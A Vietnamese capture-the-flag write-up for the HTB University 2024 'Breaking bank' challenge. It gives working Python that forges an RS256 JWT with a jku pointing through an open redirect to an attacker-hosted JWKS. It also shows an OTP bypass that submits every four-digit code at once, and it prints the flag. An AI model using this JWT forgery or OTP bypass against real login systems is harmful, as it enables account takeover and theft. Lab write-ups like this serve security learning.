---
title: "HTB University 2024: Binary badlands"
datePublished: Tue Dec 31 2024 03:36:35 GMT+0000 (Coordinated Universal Time)
cuid: cm5bx3h1y000a09l2ae1i8upm
slug: htb-university-2024-binary-badlands

---

## Breaking bank

![Screenshot 2024-12-17 215158](https://cdn.hashnode.com/res/hashnode/image/upload/v1735616201015/85dc7b38-7b82-4822-aad2-15b49fc6d98f.png align="left")

Cách lấy flag: Rút hết được tiền đơn vị CLCR của tài khoản `financial-controller@frontier-board.htb`:

![Screenshot 2024-12-17 215407](https://cdn.hashnode.com/res/hashnode/image/upload/v1735616202645/5196ec6b-179d-4291-9885-d75f401b0bf0.png align="left")

![Screenshot 2024-12-17 215641](https://cdn.hashnode.com/res/hashnode/image/upload/v1735616204174/f38a24e9-c3a9-469a-a154-ccd8262ed115.png align="left")

Cách thức tấn công: Tìm cách đăng nhập được vào tài khoản kia sau đó bypass otp để chuyển toàn bộ tiền cho 1 tài khoản khác. Đầu tiên tôi sẽ tạo 1 tài khoản tên là `fake@gmail.com` và pass là `123`

![Screenshot 2024-12-17 220013](https://cdn.hashnode.com/res/hashnode/image/upload/v1735616205870/8d8e78dc-96a2-438e-a8f2-3af53487fdc4.png align="left")

Quá nghèo, phải làm giàu thôi Trong source code được đưa cho author đã tung ra cho ta 3 gợi ý:

* Gợi ý 1:
    
    ![Screenshot 2024-12-17 220201](https://cdn.hashnode.com/res/hashnode/image/upload/v1735616207596/183eaeba-f540-4463-84a4-8ccf15810455.png align="left")
    
* Gợi ý 2:
    
    ![Screenshot 2024-12-17 220228](https://cdn.hashnode.com/res/hashnode/image/upload/v1735616209107/95af679d-fe85-49bd-8558-4279a11043b5.png align="left")
    
* Gợi ý 3:
    
    ![Screenshot 2024-12-17 220252](https://cdn.hashnode.com/res/hashnode/image/upload/v1735616210671/6cf76afc-fc91-4596-92d5-e826e7c4934d.png align="left")
    

Đầu tiên chúng ta xem gợi ý 1 cho ta điều gì:

![Screenshot 2024-12-17 220558](https://cdn.hashnode.com/res/hashnode/image/upload/v1735616212157/134f80e6-3b33-4960-ae76-07e515e4e102.png align="left")

Đó là 1 endpoint cho ta khả năng redirect trang web này sang 1 trang web khác, ở đây là link rich roll, và ta có thể thay đổi trang web ta muốn redirect bằng cách sửa parameter url.

Như phần todo đã nói, những kiểu endpoint như này rất nguy hiểm, kể cả khi không thể tấn công trực tiếp thì vẫn có thể bị lợi dụng với mục đích phising.

Tiếp theo sẽ là gợi ý số 2:

![Screenshot 2024-12-17 221101](https://cdn.hashnode.com/res/hashnode/image/upload/v1735616213941/8cb4e853-77c1-4cab-bf63-732ffdbc5b42.png align="left")

Ta được gợi ý rằng cái jku kiểu này không hề an toàn, vì ta có hẳn 1 endpoint cho phép redirect đến mọi trang web mình muốn trên con web bank này.

Sau 1 vài sự gợi ý đến từ các thành viên khác trong CLB, mình cx đã tìm được hướng để giải quyết vấn đề đăng nhập vào tài khoản gmail nạn nhân. Đó là JWKS Spoofing

Link: https://0xdf.gitlab.io/2022/05/07/htb-unicode.html

JWKS là JWT nhưng sử dụng thêm key làm cơ chế xác thực

Muốn biết được cấu trúc của key, hãy truy cập vào endpoint /.well-known/jwks.json, ở đây ta sẽ có cấu chúc cơ bản của key.

![Screenshot 2024-12-17 222605](https://cdn.hashnode.com/res/hashnode/image/upload/v1735616215716/9536550d-7d97-452a-b8f6-3c7b11307683.png align="left")

Ở trong bài này, cấu trúc của key bao gồm:

* alg: loại thuật toán của JWT
    
* kty ( key type ): Thuật toán dùng để tạo ra key
    
* use ( key use ): Mục đích sử dụng của khóa, ở đây là sig (signing)
    
* kid ( key identifier ): Mã nhận diện độc nhất của khóa
    
* n, e: 2 thành phần trong thuật toán RSA
    

Với tác dụng đó, thì thay đổi được jku sẽ thay đổi luôn signature của đoạn JWT đó, từ đó ta sẽ có cách tấn công sau.

Cách tấn công: Giống như bài được gửi trên cái link ở trên, ta sẽ tạo 1 bộ key giả mạo mà ta có thể kiểm soát, sau đó lợi dụng endpoint redirect để thay đổi jku, từ đó khiến ta có thể giả mạo được 1 JWT hợp lệ, đó chính là lý do kiểu tấn công này được gọi là JWKS Spoofing.

Đầu tiên chúng ta cần code ra 1 đoạn mã cho phép ta tạo ra 1 đoạn jwt sử dụng thuật toán rsa256, xong đó tạo ra 1 web để đăng fake key của chúng ta lên. Mình đã nhờ chatgpt code ra đoạn code sau:

```python
import jwt
import json
import base64
from datetime import datetime
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from flask import Flask, jsonify

# 0. Nhập kid và redirect url
kid = "86147695-417b-46c7-85e7-1d71ef49562a"
redirect_url="https://8178-113-185-52-248.ngrok-free.app"
target_email="financial-controller@frontier-board.htb"

# 1. Tạo private key và public key ngẫu nhiên
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# Chuyển đổi private key và public key sang PEM
private_key_pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)
public_key_pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

# 2. Thông tin header và payload của JWT
header = {
    "typ": "JWT",
    "kid": kid,
    "jku": f"http://127.0.0.1:1337/api/analytics/redirect?ref=cta-announcement&url={redirect_url}"
}

payload = {
    "email": target_email,
    "iat": int(datetime.now().timestamp())
}

# 3. Tạo JWT
jwt_token = jwt.encode(
    payload,
    private_key_pem,
    algorithm="RS256",
    headers=header
)

# 4. Tạo JWKS (JSON Web Key Set)
public_numbers = public_key.public_numbers()

def int_to_base64(num):
    """Chuyển số nguyên thành chuỗi base64 URL-safe."""
    return base64.urlsafe_b64encode(num.to_bytes((num.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode()

key = {
    "kty": "RSA",
    "n": int_to_base64(public_numbers.n),
    "e": int_to_base64(public_numbers.e),
    "alg": "RS256",
    "use": "sig",
    "kid": kid
}
jwks = {"keys": [key]}

# 5. Lưu private key và public key vào file
with open("private.pem", "w") as f:
    f.write(private_key_pem.decode())

with open("public.pem", "w") as f:
    f.write(public_key_pem.decode())

# Hiển thị JWT ra màn hình
print("Generated JWT:")
print(jwt_token)

# 6. Tạo một server Flask để phục vụ JWKS
app = Flask(__name__)

@app.route('/', methods=['GET'])
def serve_jwks():
    return jsonify(jwks)

if __name__ == '__main__':
    print("Serving JWKS at http://127.0.0.1:5000/")
    app.run(host='0.0.0.0', port=5000)
```

Điều thứ nhất, các bạn hãy thay phần kid trên với phần kid ở endpoint `/.well-known/jwks.json`

Do đoạn code này sẽ mở cổng 5000, nếu mọi người có vps thì thay redirect\_url thành địa chỉ ip của con vps đó, còn nếu mà không có vps như mình thì có thể xài ngrok bằng cách nhập lệnh `ngrok http 5000`, sau đó bạn sẽ có giao diện như sau

![Screenshot 2024-12-17 224527](https://cdn.hashnode.com/res/hashnode/image/upload/v1735616217293/cb35a64e-999f-434e-9116-10c39fa3963d.png align="left")

Địa chỉ `https://8f4b-113-185-49-94.ngrok-free.app/` kia chính là phần mà bạn sẽ thay vô phần redirect\_url

Sau khi bạn đã khởi động xong ngrok hoặc vps, giờ sẽ là lúc bạn chạy code ở trên.

![Screenshot 2024-12-17 224845](https://cdn.hashnode.com/res/hashnode/image/upload/v1735616219083/a4296d3c-80ed-4166-95e0-0fedf0a6041f.png align="left")

Sau khi chạy xong, các bạn sẽ thấy 1 cái token được in ra, và link trang web, lúc này nếu bạn truy cập vô địa chỉ ngrok hoăc vps như mình đã nói ở trước, các bạn sẽ thấy:

![Screenshot 2024-12-17 224949](https://cdn.hashnode.com/res/hashnode/image/upload/v1735616220670/f0be94a2-03da-47a5-93e1-ea9c8672c264.png align="left")

Đó là đoạn fake key của mình, việc của mình bây giờ là xác nhận xem đoạn token kia của mình thật sự hoạt động (do trong quá trình viết wup mình quên sửa kid nên phải chạy lại nên các bạn sẽ thấy token mình thêm vô sẽ khác )

![Screenshot 2024-12-17 225501](https://cdn.hashnode.com/res/hashnode/image/upload/v1735616222339/61703a15-f30a-43cf-9413-b43f947bee34.png align="left")

Tuyệt đối điện ảnh, exploit thành công, bây giờ thì f12 lên và thay phần trên thành cái token mình tạo ra thôi

![Screenshot 2024-12-17 225628](https://cdn.hashnode.com/res/hashnode/image/upload/v1735616224217/bdfd1717-0aea-49aa-a0ed-ba9be5dcd964.png align="left")

F5 và bùm

![Screenshot 2024-12-17 225735](https://cdn.hashnode.com/res/hashnode/image/upload/v1735616225939/6bdcf324-5506-4960-9963-c3a732d96a8e.png align="left")

Đm giàu vcl

Vì web này chỉ cho phép ta chuyển tiền cho bạn nên ta cần kết bạn với nick fake kia.

![Screenshot 2024-12-17 225915](https://cdn.hashnode.com/res/hashnode/image/upload/v1735616227566/25ad78cd-81cb-4e17-8e0d-c77466a9009a.png align="left")

F5 bên đầu cầu bên kia và bấm accept

![Screenshot 2024-12-17 225957](https://cdn.hashnode.com/res/hashnode/image/upload/v1735616228967/1730e673-2bd8-4494-b3ee-6cc4c1375099.png align="left")

Lúc này ta đã có thể chuyển tiền cho nick kia

![Screenshot 2024-12-17 230046](https://cdn.hashnode.com/res/hashnode/image/upload/v1735616230490/17ab98ae-1f71-4bd5-8e0d-b3a0032c1ec2.png align="left")

Nhập cái số available balance kia vô rồi send thôi

![Screenshot 2024-12-17 230204](https://cdn.hashnode.com/res/hashnode/image/upload/v1735616232045/d7ce05c9-8573-4af2-a893-c26064ac94b7.png align="left")

Oh shiet OTP, nhập bừa xong bấm confirm thôi (chắc chắn sai r)

Lúc này hãy vào burp và send to repeater

![Screenshot 2024-12-17 230319](https://cdn.hashnode.com/res/hashnode/image/upload/v1735616233751/71aae3cf-a106-4392-b7e2-a3197a87b816.png align="left")

Làm thế nào bây giờ :(

Giờ chính là lúc dùng gợi ý số 3.

Mọi người có để ý chữ include không, tức nghĩa là chỉ cần trong cái otp có mặt cái hợp lệ là nó cho pass luôn, vậy thì bây h ta chỉ cần in ra 1 cái list từ 0000 đến 9999 rồi ctrl c + ctrl v vô là easy bypass.

```plaintext
import json

numbers = [f'{i:04}' for i in range(10000)]

# Ghi vào file với dấu ngoặc kép
with open('numbers.txt', 'w') as f:
    json.dump(numbers, f)
```

Chạy đoạn code sau, xong vào file number.txt, ctrl c ctrl v thay thế phần \["1111"\]

Và ta có:

![Screenshot 2024-12-17 230751](https://cdn.hashnode.com/res/hashnode/image/upload/v1735616235737/7ab43d6e-2f69-443e-a1ba-1f3742af4245.png align="left")

Bây giờ hãy quay trở lại phần api/dashboard và restart lại nào

![Screenshot 2024-12-17 230855](https://cdn.hashnode.com/res/hashnode/image/upload/v1735616237786/612a6da9-fceb-4a07-a6bc-cfc7a5efd682.png align="left")

GG

### Flag:

HTB{rugg3d\_pu11ed\_c0nqu3r3d\_d14m0nd\_h4nd5\_b6128c123229cf8b3e0eb8c8b27a388c}